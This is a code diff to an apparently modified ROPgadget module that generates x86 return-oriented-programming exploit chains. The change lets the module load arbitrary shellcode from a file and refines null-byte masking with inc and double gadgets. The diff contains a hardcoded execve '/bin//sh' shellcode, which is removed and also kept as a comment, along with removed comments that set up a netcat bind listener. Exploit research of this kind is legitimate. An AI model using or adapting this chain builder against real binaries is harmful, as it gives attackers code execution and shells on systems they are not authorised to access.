@@ -14,7 +14,7 @@ from ropgadget.ropchain.MaskBuilder import MaskBuilder as mb
 from collections import defaultdict
 
 class ROPMakerX86(object):
-    def __init__(self, binary, gadgets, padding, execve, is_shellCode, liboffset=0x0):
+    def __init__(self, binary, gadgets, padding, execve, shellCode_filePath, liboffset=0x0):
         self.__binary  = binary
         self.__gadgets = gadgets #+ [{"vaddr" : 0xEEFFEEDD, "gadget" : "pop ebx ; ret"}, {"vaddr" : 0xAABBBBCC, "gadget" : "pop esi ; ret"}, {"vaddr" : 0xAACCDDCC, "gadget" : "sub ebx, esi ; ret"}]
 
@@ -28,7 +28,7 @@ class ROPMakerX86(object):
 
         self.__execve = execve          ### MODIFIED
         self.__WORD_SIZE = 4            ### MODIFIED
-        self.__is_shellCode = is_shellCode
+        self.__FILE_PATH_SHELLCODE = shellCode_filePath     ### MODIFIED
 
         self.possibledoubles = {}
         self.possiblemasks = {}
@@ -403,16 +403,9 @@ class ROPMakerX86(object):
             print("\n[-] Error - Can't find a writable section")
             return
 
-        p = b'A' * self.padding
-        #p = b'A' * 44
-        
-        #args = [b'/bin/nc', b'-lvp', b'6666']
-        
-        #foo = ["/bin/nc","-lvp","6666"]
-        #foo = ["/usr/bin/python3", "ROPgadget/ROPgadget.py", "--binary", "vuln3-32", "--ropchain"]
-        #print(self.PreProcessArgs(foo))
-
-        #args = self.PreProcessArgs(foo) # foo = 
+        # Add padding
+        p = b'A' * self.padding        
+       
         print(self.__execve)
 
         stack = dataAddr
@@ -560,14 +553,18 @@ class ROPMakerX86(object):
         # 6e 89 e3 50
         # 53 89 e1 99
         # b0 0b cd 80
-
-        shellCode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'
-        #shellCode = b'\x68\x50\xc0\x31\x68\x73\x2f\x2f\x69\x62\x2f\x68\x50\xe3\x89\x6e\x99\xe1\x89\x53\x80\xcd\x0b\xb0'
-        len_shellCode = 4096#32#len(shellCode)#*2 + 0x00000FFF
+        
+        file = open(self.__FILE_PATH_SHELLCODE, "rb")
+        shellCode = file.read()
+        file.close()
+        #shellCode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'
+        #len_shellCode = 4096#32#len(shellCode)#*2 + 0x00000FFF
 
         
         start_of_page = (dataAddr & 0xFFFFF000)
         topOfData = dataAddr
+
+        len_shellCode = topOfData - start_of_page + len(shellCode)
 
         # Load shellcode into .data (this might not work as .data normally cant be executable)
         for i in range(0, int(len(shellCode)/self.__WORD_SIZE) ):
@@ -622,7 +619,7 @@ class ROPMakerX86(object):
         p += pack('<I', dataAddr) 
         #p += pack("<I", loc_shellCode)
         #print(p)
-        print("Syscall addr: {0}".format(syscall["vaddr"]))
+        print("Syscall addr: {0:8X}".format(syscall["vaddr"]))
         print("MASK CHAIN FOR ECX:", maskEcx)
         print("Does p contain a NULL?", nh(self.__WORD_SIZE).contains_null(p), "size of ROpchain in bytes:", len(p))
         print("Start of .data: {0:8X}. Start of .bss: {2:8X}. Start of shellcode on the stack: {1:8X}".format(start_of_page, dataAddr, bss))
@@ -636,8 +633,8 @@ class ROPMakerX86(object):
 
     def testingmasking(self, write4where, popDst, popSrc, xorSrc, xorEax, incEax, popEbx, maskEbx, popEcx, maskEcx, popEdx, MaskEdx, syscall, chainmask):
      
-        p = b'\x41' * 44
-        p += self.GenerateMaskRopChain(0xAB1100F9, maskEbx, {})
+        p = b'\x41' * self.padding
+        p += self.GenerateMaskRopChain(4096, maskEcx, {})
 
         #print("Full mask tings")
         print("ROPCHAIN is:", p)
@@ -678,14 +675,12 @@ class ROPMakerX86(object):
             if (chainmask["method"] == "dec" or chainmask["method"] == "inc"):
 
                 # Use DEC as the (un)masker
-
+               
                 mask, masked_value = nh(self.__WORD_SIZE).CreateIterativeMask(value.to_bytes(4, byteorder="big"), chainmask["method"]) 
-                # pop into some reg
 
-                #print("Mask:", mask, "Masked_value:", masked_value)
-
-                #mask = 0
-                #masked_value = 0
+                # Create mask for double with inc gadget
+                if (chainmask["method"] == "inc" and (not (chainmask["doublegadget"] is None))):
+                    masked_value = 0xFFFFFFFF            
 
                 print("Mask:", mask, "Masked_value:", masked_value)
 
@@ -704,30 +699,34 @@ class ROPMakerX86(object):
                 otherregs[popsomereg["gadget"].split()[1]] = masked_value 
                 doublegadget = chainmask["doublegadget"]
 
+
+                # Do we have a doublegadget
                 doubleinc = None 
                 if(chainmask["method"] == "inc" and chainmask["doublegadget"]):
+                    doubleinc = chainmask["doublegadget"]
 
-                    newmasked_value = masked_value
-                    for i in range(50):
-                        newmasked_value = (newmasked_value + newmasked_value) 
-                        if(newmasked_value > 0xFFFFFFFF):
-                            newmasked_value = newmasked_value - 0xFFFFFFFF 
+                    op_chain = nh(self.__WORD_SIZE).CreateDoubleWithIncMaskOperationChain(value)
 
-                        tmp = value - masked_value 
-                        if(tmp > 0):
-                            if(doubleinc is None or sum(doubleinc) > i + tmp):
-                                doubleinc = [i,tmp]
+                    # Set our masked_value to 0 from 0xFFFFFFFF
+                    p += pack("<I", maskgadget["vaddr"])
+                    p += self.__custompadding(maskgadget, otherregs)
 
-                if not doubleinc is None and sum(doubleinc) < mask:
-                    for i in range(doubleinc[0]):
+                    for op in op_chain:
+                        if   (op == "inc"):
+                            # Add increment to the chain
+                            p += pack("<I", maskgadget["vaddr"])
+                            p += self.__custompadding(maskgadget, otherregs)
+                        
+                        elif (op == "double"):
+                            # Add the double gadget
+                            p += pack("<I", doublegadget[0]["vaddr"])
+                            p += self.__custompadding(doublegadget[0], otherregs)
 
-                        printp.append(doublegadget)
-                        p += pack("<I", doublegadget["vaddr"])
-                        p += self.__custompadding(doublegadget, otherregs)
-                    
-                    mask = doubleinc[1]
-                    
-                if(mask < 50000):
+                        else:
+                            raise Exception("How the hell did you get here?")
+
+                # If there is no double then we can just use dec/inc
+                elif(mask < 500):
                     for i in range(mask):
 
                         printp.append(maskgadget)
@@ -1018,6 +1017,7 @@ class ROPMakerX86(object):
 
         print("\n- Step 5 -- Build the ROP chain\n")
 
+        #print("syscall: {0}".format(syscall))
         #self.__buildRopChain(write4where[0], popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall)
         #self.customRopChain(write4where[0], popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall)
         #self.arbitrary_shell_code(write4where[0], popDst, popSrc, xorSrc, xorEax, incEax, popEbx, MaskEbx, popEcx, MaskEcx, popEdx, MaskEdx, syscall, listchainmask)
@@ -1027,7 +1027,8 @@ class ROPMakerX86(object):
         
 
         # Selects if we are generating shellcode or a ROPchain
-        if (self.__is_shellCode):
+        if (self.__FILE_PATH_SHELLCODE):
             self.arbitrary_shell_code(write4where[0], popDst, popSrc, xorSrc, xorEax, incEax, popEbx, MaskEbx, popEcx, MaskEcx, popEdx, MaskEdx, syscall, listchainmask)
         else:
             self.customRopChain(write4where[0], popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall)
+        
